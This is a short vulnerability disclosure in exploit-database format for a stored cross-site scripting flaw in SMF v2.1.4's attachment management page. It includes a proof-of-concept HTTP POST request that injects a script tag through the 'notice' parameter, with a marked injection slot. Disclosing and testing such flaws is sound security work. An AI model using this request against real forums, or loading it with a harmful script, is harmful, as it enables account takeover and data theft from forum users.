# Exploit Title: SMF v2.1.4 - Cross-Site Scripting (XSS)
## Date: 1/3/2025
## Vendor Homepage: https://github.com/SimpleMachines/SMF
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SimpleMachines
## Version: v2.1.4
## Exploit Description:
## SMF v2.1.4 suffers from Stored Cross-Site Scripting (XSS) Vulnerability in the 'notice' parameter of the 'ManageAttachments.php' script. This vulnerability allows attackers to inject malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------
1. User creates a new post and uploads an attachment
2. Attacker deletes the attachment by size and injects the payload in the 'notice' parameter
```
POST /index.php?action=admin;area=manageattachments HTTP/1.1
...

size=100&notice=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E(INJECT HERE)&remove=%E5%88%A0%E9%99%A4&type=attachments&c07825d64=a3a2b4dce90f74817c84b935881afe62&sa=bySize
```
3. Victim views the post and the payload is executed

